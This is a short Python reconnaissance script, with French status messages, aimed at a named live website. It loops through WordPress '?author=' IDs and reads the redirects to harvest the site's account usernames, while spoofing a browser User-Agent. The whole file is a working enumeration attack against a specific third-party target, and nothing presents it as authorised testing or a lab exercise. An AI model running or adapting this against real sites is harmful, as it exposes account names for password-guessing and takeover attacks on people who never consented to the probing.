import requests

TARGET_URL = "https://www.supercinebattle.fr"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def enumerate_users_via_archives(limit=5):
    print("[*] Énumération des utilisateurs via les archives...\n")
    for i in range(1, limit + 1):
        try:
            res = requests.get(f"{TARGET_URL}/?author={i}", headers=HEADERS, timeout=5, allow_redirects=True)
            if "/author/" in res.url:
                username = res.url.split("/author/")[-1].strip("/")
                print(f"[+] ID {i} : Utilisateur -> '{username}'")
            else:
                print(f"[-] ID {i} : Aucune redirection.")
        except Exception as e:
            print(f"[!] Erreur sur l'ID {i} : {e}")

if __name__ == "__main__":
    enumerate_users_via_archives(5)